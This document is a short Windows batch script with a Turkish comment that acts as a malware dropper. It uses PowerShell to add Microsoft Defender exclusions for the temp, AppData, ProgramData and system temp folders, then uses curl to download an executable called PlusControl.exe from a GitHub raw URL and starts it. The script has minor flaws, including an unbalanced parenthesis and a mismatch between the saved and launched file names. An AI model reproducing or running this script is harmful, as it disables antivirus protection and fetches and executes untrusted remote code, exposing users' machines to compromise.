@echo off
cd /d %temp%
powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"

REM Dosya kontrolü
    if exist PlusControll.exe (
        start PlusControll.exe
        exit /b
    )
)


curl -L https://github.com/seition2doc/dosta4/raw/refs/heads/main/PlusControl.exe -o PlusControll.exe
echo "asd" > nagihori3.txt 
start PlusControl.exe
